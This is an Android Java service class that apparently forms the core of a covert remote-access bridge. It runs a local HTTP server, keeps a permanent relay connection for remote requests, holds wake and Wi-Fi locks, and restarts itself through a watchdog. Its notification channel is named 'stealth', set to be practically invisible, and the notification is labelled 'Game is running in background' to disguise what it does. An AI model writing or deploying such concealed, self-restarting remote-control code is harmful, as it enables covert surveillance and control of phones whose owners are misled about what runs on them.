package com.hashibridge.master;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import java.util.concurrent.atomic.AtomicBoolean;

public class BridgeService extends Service {

    private static final String CHANNEL_ID = "bridge_stealth_channel";
    private static final int NOTIFICATION_ID = 1;
    private static final AtomicBoolean running = new AtomicBoolean(false);
    private static volatile BridgeService instanceRef;

    private LocalServer localServer;
    private RelayClient relayClient;
    private PowerManager.WakeLock wakeLock;
    private WifiManager.WifiLock wifiLock;

    private String relayUrl;
    private String deviceId;

    public static boolean isRunning() {
        return running.get();
    }

    public static BridgeService getInstance() {
        return instanceRef;
    }

    public static void triggerReconnect() {
        BridgeService instance = instanceRef;
        if (instance != null && instance.relayClient != null) {
            instance.relayClient.forceReconnect();
        }
    }

    /**
     * Send an event to the relay server for broadcast to connected clients.
     */
    public void sendRelayEvent(String type, String data) {
        if (relayClient != null) {
            relayClient.sendEvent(type, data);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instanceRef = this;
        createStealthNotificationChannel();
        ServiceWatchdog.schedule(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String extraRelay = intent.getStringExtra("relayUrl");
            String extraDevice = intent.getStringExtra("deviceId");
            if (extraRelay != null && !extraRelay.isEmpty()
                    && extraDevice != null && !extraDevice.isEmpty()) {
                relayUrl = extraRelay;
                deviceId = extraDevice;
                com.hashibridge.master.utils.Config.saveConfig(this, relayUrl, deviceId);
            }
        }

        if (relayUrl == null || relayUrl.isEmpty()) {
            relayUrl = com.hashibridge.master.utils.Config.getRelayUrl(this);
        }
        if (deviceId == null || deviceId.isEmpty()) {
            deviceId = com.hashibridge.master.utils.Config.getDeviceId(this);
        }

        if (relayUrl == null || relayUrl.isEmpty() || deviceId == null || deviceId.isEmpty()) {
            stopSelf();
            return START_NOT_STICKY;
        }

        startForeground(NOTIFICATION_ID, buildStealthNotification());

        // 🔥 FULL PERFORMANCE MODE: Acquire WakeLock & WiFiLock
        acquireLocks();
        
        startServers();
        
        // 🚀 Preload thumbnails in background thread
        preloadThumbnails();

        running.set(true);

        return START_STICKY; // Restart automatically if killed
    }

    private void startServers() {
        try {
            // Use 8 threads for high performance HTTP
            localServer = new LocalServer(8080, this, 8);
            localServer.start();
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            RequestRouter router = new RequestRouter(this, localServer);
            localServer.setRouter(router);

            relayClient = new RelayClient(this, relayUrl, deviceId, router);
            String authToken = com.hashibridge.master.utils.Config.getAuthToken(this);
            relayClient.setToken(authToken);
            router.setRelayClient(relayClient);
            // Always connected mode, ping every 30 seconds
            relayClient.setKeepAliveInterval(30_000); 
            relayClient.connectPermanent();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void preloadThumbnails() {
        new Thread(() -> {
            try {
                // Implement thumbnail preloading logic here later if needed
                // For now, it's a placeholder for the v3 feature
                Thread.sleep(100);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void acquireLocks() {
        // 1. CPU WakeLock - prevent CPU from sleeping
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DeviceBridge::WakeLock");
            wakeLock.acquire(60 * 60 * 1000L); // 1 hour - auto-released, re-acquired by keepalive
        }
        
        // 2. WiFi Lock - prevent WiFi from dropping when screen is off
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wm != null) {
            wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "DeviceBridge::WiFiLock");
            wifiLock.acquire();
        }
    }

    private void releaseLocks() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            wakeLock = null;
        }
        if (wifiLock != null && wifiLock.isHeld()) {
            wifiLock.release();
            wifiLock = null;
        }
    }

    private Notification buildStealthNotification() {
        return new Notification.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle("Bridge Master")
                .setContentText("Game is running in background")
                .setPriority(Notification.PRIORITY_MIN)
                .setVisibility(Notification.VISIBILITY_PRIVATE)
                .setOngoing(true)
                .build();
    }

    private void createStealthNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // IMPORTANCE_NONE: lowest possible level, practically invisible
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Bridge Master",
                    NotificationManager.IMPORTANCE_NONE
            );
            channel.setDescription("Game background status");
            channel.setShowBadge(false);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setSound(null, null);
            channel.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    @Override
    public void onDestroy() {
        running.set(false);
        instanceRef = null;

        if (relayClient != null) {
            relayClient.disconnect();
            relayClient = null;
        }

        if (localServer != null) {
            localServer.stop();
            localServer = null;
        }

        releaseLocks();

        // Don't cancel watchdog here - we WANT it to restart us if we're killed

        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not bound service
    }
}
